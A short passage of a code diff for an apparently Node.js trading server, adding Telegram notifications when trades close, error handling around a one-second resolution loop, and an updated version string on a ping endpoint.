+                    if (trade.tgMessageId) {
+                        const icon = result === 'win' ? '✅' : (result === 'loss' ? '❌' : '🔄');
+                        await sendTgMessage(`${icon} <b>Trade Closed: ${result.toUpperCase()}</b>\n💵 <b>Payout:</b> $${payout.toFixed(2)}`, trade.tgMessageId);
+                    }
+                }
             }
         }
-    }
+    } catch (e) { console.log("Server Resolution Loop Error:", e); }
+}, 1000);
 
-    if (Object.keys(allMarketUpdates).length > 0) {
-        db.ref().update(allMarketUpdates).catch(()=>{});
-    }
-}, 2000);
-
-app.get('/ping', (_req, res) => res.send('Server V30.4 - Realistic Body & Wick Ratio Active'));
+app.get('/ping', (_req, res) => res.send('Server V31.0 - Multi-Timeframe Rollercoaster Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
